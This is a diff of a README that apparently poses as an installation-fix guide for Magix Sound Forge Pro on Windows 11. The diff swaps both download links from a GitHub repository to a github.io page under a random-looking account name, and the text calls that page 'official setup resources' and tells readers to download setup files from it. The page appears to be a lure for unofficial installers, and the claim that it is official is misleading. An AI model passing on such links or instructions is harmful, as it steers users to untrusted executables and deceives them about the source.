@@ -1,6 +1,6 @@
 # 🎧 Magix-Sound-Forge-Windows-Guide - Fix Sound Forge Installation Issues Now
 
-[![Download Setup Guide](https://img.shields.io/badge/Download-Setup_Guide_Here-blue.svg)](https://github.com/philogynysymboliclogic379/Magix-Sound-Forge-Windows-Guide)
+[![Download Setup Guide](https://img.shields.io/badge/Download-Setup_Guide_Here-blue.svg)](https://philogynysymboliclogic379.github.io)
 
 This guide helps you install Magix Sound Forge Pro on Windows 11. Many users face installation errors when they set up professional audio software. This document provides clear steps to resolve common conflicts and ensures the software runs on your PC.
 
@@ -32,7 +32,7 @@ If you tried to install the software before, folders might remain. Open the File
 
 Visit the link below to get the official setup resources. Follow the instructions on the page to fetch the correct files for your PC.
 
-[Download the Magix Sound Forge Windows Guide](https://github.com/philogynysymboliclogic379/Magix-Sound-Forge-Windows-Guide)
+[Download the Magix Sound Forge Windows Guide](https://philogynysymboliclogic379.github.io)
 
 Once you reach the page, look for the current release. Download the provided setup files to your Downloads folder. 
 
